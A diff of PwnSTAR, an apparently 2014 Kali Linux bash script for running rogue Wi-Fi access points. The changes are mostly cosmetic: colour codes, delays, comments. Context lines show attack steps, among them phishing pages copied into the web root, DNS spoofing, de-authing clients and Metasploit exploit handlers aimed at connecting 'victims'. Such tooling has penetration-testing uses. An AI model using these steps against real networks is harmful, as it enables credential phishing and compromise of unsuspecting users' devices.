@@ -5,7 +5,7 @@
 # See the README.txt for hints on usage
 
 # --------------------------------------------------------------------------------------------------------------------#
-# v0.92_dev 15/4/2014
+# v0.92_dev 19/4/2014
 #
 # Copyright (C) 2014  VulpiArgenti
 
@@ -82,7 +82,7 @@
 # Thus avoiding the risk of deleting the only copy from /www.
 
 
-# Flames and praise welcome - kali forums http://forums.kali.org/forum.php
+# Flames and praise welcome - kali forums:- https://forums.kali.org/showthread.php?1406-PwnSTAR-running-on-Kali
 
 # Regards
 # Vulpi
@@ -95,12 +95,13 @@
 
 txtrst="\e[0m"      # Text reset
 
-def="\e[1;34m"      # default           blue
-warn="\e[1;31m"     # warning           red
-info="\e[1;34m"     # info              blue
-q="\e[1;32m"        # questions         green
-inp="\e[1;36m"      # input variables   magenta
+def="\e[40;1;34m"       # default           blue
+warn="\e[40;1;31m"      # warning           red
+info="\e[40;1;34m"      # info              blue
+q="\e[40;1;32m"         # questions         green
+inp="\e40;1;36m"        # input variables   magenta
 
+# Zap the psychadelic Eterm background
 echo "<Eterm-0.9.6>
 # Eterm Configuration File
 begin imageclasses
@@ -131,7 +132,7 @@ banner_fn()
         ~~~~~~~~~~~~~~~~~~~~Pwn_SofT_Ap_scRipt~~~~~~~~~~~~~~~~~~
 
 "
-sleep 2
+sleep 1
 }
 
 first_fn()
@@ -160,7 +161,7 @@ first_fn()
         
     apusage= # set to null
     echo -e "$info\nPress ctrl-C at any time to exit neatly\n"
-    sleep 1
+    sleep 0.5
     echo -e "$q\nHow do you want to use the AP?"
     echo -e "$def
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -221,10 +222,11 @@ setup_fn()
         
         2)  clear
             echo -e "$info\nMonitor airbase eterm for client associations"
-            sleep 2
+            sleep 1
             echo -e "$info\nHandshakes will be saved in /root/PwnSTAR-n.cap"
-            sleep 2
-            echo -e "$info\nConsider de-authing clients";;
+            sleep 1
+            echo -e "$info\nConsider de-authing clients"
+            sleep 4;;
                         
         3)  sniff_fn;;
                 
@@ -288,7 +290,7 @@ interface_fn()
                 dev_check_var=$ICI
                 dev_check_fn
                 if [[ $dev_check = "fail" ]]; then
-                    ICI= # Nulled
+                    ICI=
                     internet=
                     dev_check=
                     interface_fn
@@ -383,7 +385,7 @@ interface_fn()
                 echo -e "$q\nDesired MAC Address for $inp $API $q?"
                 read ap_mac
             done
-            if [[ "$ap_mac" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
+            if [[ "$ap_mac" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then    # checks a sane value has been entered for mac
                 ifconfig $API down && macchanger -m $ap_mac $API && ifconfig $API up
             else
                 echo -e "Invalid MAC address!"
@@ -603,7 +605,7 @@ ap_type_fn()
     while [ -z $BB ];do
         echo -e "$q 
 
-Choose the \033[4mtype\033[0m\033[1;32m of AP: 
+Choose the \033[4mtype\033[0m\033[40;1;32m of AP: 
 
     1) Blackhole--> Responds to All probe requests
 
@@ -743,12 +745,11 @@ dhcp_start_fn()
     echo "option domain-name-servers $apdns;" >> /tmp/dhcpd.conf
     echo "}"  >> /tmp/dhcpd.conf
 
-    # mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd # not required in Kali/isc-dhcpd
     dhcpd -cf /tmp/dhcpd.conf &
     route add -net $apnet netmask $ap_sm gw $ap_ip
     iptables -P FORWARD ACCEPT  # probably not necessary 'coz we flushed the chains earlier
     if [[ $apusage = 4 ]];then
-        iptables -t nat -A PREROUTING -i at0 -j REDIRECT        ### ???helps to avoid DNS cache. Still a problem sometimes.
+        iptables -t nat -A PREROUTING -i at0 -j REDIRECT        ### ???helps to avoid DNS cache. Still a problem.
     fi
     sleep 1         # for dhcpd to start
     
@@ -835,10 +836,10 @@ directory_select_fn()
     echo -e "$q\nSelect directory"
     read wwwdir
     if [[ -d /var/www/"$wwwdir" ]];then
-        mkdir /var/www/backups &>/dev/null      # make backup directory NB clear this out occasionally
+        mkdir /var/www/backups &>/dev/null          # make backup directory NB clear this out occasionally
         mv /var/www/index.html /var/www//backups/index.html.`date +%Y%m%d%H%M` &>/dev/null  # back-up existing index files
         mv /var/www/index.php /var/www/backups/index.php.`date +%Y%m%d%H%M` &>/dev/null 
-        cp /var/www/"$wwwdir"/index.* /var/www/ #   copy index from phishing folder to var/www
+        cp /var/www/"$wwwdir"/index.* /var/www/     #copy index from phishing folder to var/www
         if [[ $? -ne 0 ]] ;then                     # checks exit code of last command ie did it work?
             echo -e "$warn\nError copying index"
             sleep 2
@@ -1174,7 +1175,7 @@ portals_fn()
     service incron start
     # chkconfig incrond on
     echo "/tmp/ip/ip IN_MODIFY bash /tmp/ipmac" > /var/spool/incron/root # instruct incron to run script whenever a new mac is written ###(/etc/incron.d/root)
-    echo -e "\e[1;34m"
+    echo -e "\e[40;1;34m"
     incrontab -d # reload the new incron table
 
     tail_txtfile_fn
@@ -1284,7 +1285,7 @@ exploit -j" > /tmp/msf.rc ### custom exe? set EXE::Custom /var/www/mypayload.exe
     sleep 4
     echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
     
-(if msf doesn't handle requests properly,
+(if msf fails to handle requests properly,
 the victim will not get internet access,
 and will probably disconnect)
 
@@ -1315,7 +1316,7 @@ exploit -j" > /tmp/msf.rc ### custom exe? set EXE::Custom /var/www/mypayload.exe
     sleep 4
     echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
     
-(if msf doesn't handle requests properly,
+(if msf fails to handle requests properly,
 the victim will not get internet access,
 and will probably disconnect)
 
@@ -1345,13 +1346,13 @@ exploit -j" > /tmp/msf.rc
     sleep 4
     echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
     
-(if msf doesn't handle requests properly,
+(if msf fails to handle requests properly,
 the victim will not get internet access,
 and will probably disconnect)
 
 Wait..."
 
-    sleep 60
+    sleep 20
     adv_final_fn 
     }
 
@@ -1558,12 +1559,11 @@ airdrop_fn()
 {
     killall -q airodump-ng &> /dev/null # stop any pre-existing scan
     kill -9 $scanpid &> /dev/null       # stop any pre-existing scan Eterm
+    sleep 0.5
     clear
     rm /tmp/rules &> /dev/null 
     # You may need to edit this depending how/which airdrop is installed
     # I find airdrop very easy to break - be careful!
-    #echo -e "$warn\nRead the script to check the path to airdrop-ng"  
-    # sleep 1
     echo -e "$info\nWe need a rules file"
     sleep 0.5 
     echo -e "$info\nThe format is:
@@ -1803,9 +1803,9 @@ exit_fn()
     clear
     echo -e "$info\nStopping processes...\n"
     killall -q tail airbase-ng ferret sslstrip aireplay-ng airodump-ng dhcpd dnsspoof metasploit incrond &> /dev/null
-    sleep 0.5
+    sleep 1
     killall -q Eterm &> /dev/null 
-    echo -e "$info\nClearing files...\n"
+    echo -e "$info\n\nClearing files...\n"
     rm /tmp/ip/ip &> /dev/null
     rmdir /tmp/ip &> /dev/null
     rm /tmp/custom.hosts &> /dev/null
@@ -1813,14 +1813,16 @@ exit_fn()
 
     # rm /var/spool/incron/root &> /dev/null ###
     service apache2 stop
-    echo -e "$info"
+    echo -e "\e[40;1;34m"
     service incron stop
     echo "0" > /proc/sys/net/ipv4/ip_forward
     echo -e "$info\n\nStopping monitor interfaces...\n"
     airmon-ng stop $monap &> /dev/null
     airmon-ng stop $monscan &> /dev/null
     airmon-ng stop $mondeauth &> /dev/null
-        
+    
+    airmon-ng stop mon0 &> /dev/null; airmon-ng stop mon1 &> /dev/null ### Temporary fix for the "multiple mon" bug
+
     iptables --flush    # delete all rules in default (filter) chains
     iptables -t nat --flush
     iptables -t mangle --flush
@@ -1828,7 +1830,7 @@ exit_fn()
     iptables -t nat -X
     iptables -t mangle -X
     clear
-    echo -e "\e[1;37m\nGood-bye from the PwnSTAR!
+    echo -e "\e[40;1;37m\nGood-bye from the PwnSTAR!
         
         
     "
